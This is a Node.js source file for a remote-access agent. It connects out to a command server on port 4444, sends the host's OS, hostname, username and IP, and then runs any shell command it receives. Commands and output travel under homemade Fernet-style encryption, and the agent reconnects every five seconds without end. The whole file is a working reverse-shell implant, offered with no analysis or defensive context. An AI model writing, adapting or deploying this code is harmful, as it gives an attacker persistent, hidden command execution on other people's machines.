const net = require('net');
const crypto = require('crypto');
const os = require('os');
const { exec } = require('child_process');

const SERVER_HOST = '0.0.0.0';
const SERVER_PORT = 4444;

let key = null;

function getLocalIP() {
    const interfaces = os.networkInterfaces();
    for (const name of Object.keys(interfaces)) {
        for (const iface of interfaces[name]) {
            if (iface.family === 'IPv4' && !iface.internal) {
                return iface.address;
            }
        }
    }
    return 'N/A';
}

function fernetDecrypt(token, key) {
    try {
        const decoded = Buffer.from(token, 'base64');
        
        if (decoded.length < 57) {
            return null;
        }
        
        const version = decoded[0];
        if (version !== 0x80) {
            return null;
        }
        
        const timestamp = decoded.slice(1, 9);
        const iv = decoded.slice(9, 25);
        const ciphertext = decoded.slice(25, -32);
        const receivedHMAC = decoded.slice(-32);
        
        const hmac = crypto.createHmac('sha256', key);
        hmac.update(decoded.slice(0, -32));
        const computedHMAC = hmac.digest();
        
        if (!crypto.timingSafeEqual(receivedHMAC, computedHMAC)) {
            return null;
        }
        
        const decipher = crypto.createDecipheriv('aes-128-cbc', key.slice(0, 16), iv);
        decipher.setAutoPadding(true);
        
        let plaintext = decipher.update(ciphertext);
        plaintext = Buffer.concat([plaintext, decipher.final()]);
        
        return plaintext.toString('utf8');
    } catch (e) {
        console.error('[-] Decrypt error:', e.message);
        return null;
    }
}

function fernetEncrypt(data, key) {
    try {
        const version = Buffer.from([0x80]);
        const timestamp = Buffer.allocUnsafe(8);
        timestamp.writeBigInt64BE(BigInt(Math.floor(Date.now() / 1000)));
        
        const iv = crypto.randomBytes(16);
        
        const cipher = crypto.createCipheriv('aes-128-cbc', key.slice(0, 16), iv);
        cipher.setAutoPadding(true);
        
        let ciphertext = cipher.update(data, 'utf8');
        ciphertext = Buffer.concat([ciphertext, cipher.final()]);
        
        const payload = Buffer.concat([version, timestamp, iv, ciphertext]);
        
        const hmac = crypto.createHmac('sha256', key);
        hmac.update(payload);
        const hmacDigest = hmac.digest();
        
        const token = Buffer.concat([payload, hmacDigest]);
        
        return token.toString('base64');
    } catch (e) {
        console.error('[-] Encrypt error:', e.message);
        return null;
    }
}

function executeCommand(command, systemInfo) {
    return new Promise((resolve) => {
        if (command === 'SYSINFO') {
            let output = `OS: ${systemInfo.os}\n`;
            output += `Hostname: ${systemInfo.hostname}\n`;
            output += `User: ${systemInfo.user}\n`;
            output += `Arch: ${systemInfo.arch}\n`;
            output += `Agent IP: ${systemInfo.agentIP}\n`;
            output += `Node.js Version: ${process.version}\n`;
            output += `Current Dir: ${process.cwd()}`;
            resolve(output);
        } else if (command === 'SCREENSHOT') {
            resolve('ERROR: Screenshot not supported in Node.js agent');
        } else if (['exit', 'quit', 'disconnect'].includes(command.toLowerCase())) {
            resolve('Agent disconnecting...');
        } else {
            exec(command, { maxBuffer: 10 * 1024 * 1024 }, (error, stdout, stderr) => {
                const output = stdout + stderr;
                if (output.trim() === '') {
                    resolve('Command executed (no output)');
                } else {
                    resolve(output);
                }
            });
        }
    });
}

async function connectToServer() {
    console.log(`[*] Connecting to ${SERVER_HOST}:${SERVER_PORT}`);
    
    const client = new net.Socket();
    
    return new Promise((resolve) => {
        client.connect(SERVER_PORT, SERVER_HOST, async () => {
            console.log('[+] Connected!');
            
            client.once('data', async (data) => {
                const keyStr = data.toString().trim();
                key = Buffer.from(keyStr, 'utf8');
                
                console.log(`[+] Key received (${key.length} bytes)`);
                
                const hostname = os.hostname();
                const user = os.userInfo().username;
                const osName = os.platform();
                const arch = os.arch();
                const agentIP = getLocalIP();
                
                const systemInfo = {
                    os: osName,
                    hostname: hostname,
                    user: user,
                    arch: arch,
                    agentIP: agentIP
                };
                
                const info = {
                    os: osName,
                    hostname: hostname,
                    user: user,
                    architecture: arch,
                    agentIP: agentIP,
                    pythonVersion: `Node.js-${process.version}`
                };
                
                client.write(JSON.stringify(info));
                
                setTimeout(() => {
                    console.log('[+] Handshake complete');
                }, 500);
                
                client.on('data', async (data) => {
                    const encryptedCmd = data.toString('utf8');
                    
                    const command = fernetDecrypt(encryptedCmd, key);
                    
                    if (!command) {
                        console.log('[-] Failed to decrypt command');
                        console.log('[-] Received:', encryptedCmd.substring(0, 50));
                        return;
                    }
                    
                    const displayCmd = command.length > 50 ? command.substring(0, 50) + '...' : command;
                    console.log(`[+] Command received: ${displayCmd}`);
                    
                    let output = await executeCommand(command, systemInfo);
                    
                    if (output.length > 1000000) {
                        output = output.substring(0, 1000000) + '\n...[OUTPUT TRUNCATED - TOO LARGE]';
                    }
                    
                    const encryptedOutput = fernetEncrypt(output, key);
                    
                    if (!encryptedOutput) {
                        console.log('[-] Failed to encrypt output');
                        return;
                    }
                    
                    client.write(encryptedOutput + '<END>');
                    
                    console.log(`[+] Response sent (${encryptedOutput.length} bytes)`);
                    
                    if (['exit', 'quit', 'disconnect'].includes(command.toLowerCase())) {
                        client.end();
                    }
                });
            });
        });
        
        client.on('error', (err) => {
            console.log(`[-] Error: ${err.message}`);
            resolve();
        });
        
        client.on('close', () => {
            console.log('[*] Disconnected');
            resolve();
        });
    });
}

async function main() {
    while (true) {
        try {
            await connectToServer();
        } catch (e) {
            console.log(`[-] Error: ${e.message}`);
        }
        
        console.log('[*] Reconnecting in 5 seconds...');
        await new Promise(resolve => setTimeout(resolve, 5000));
    }
}

main();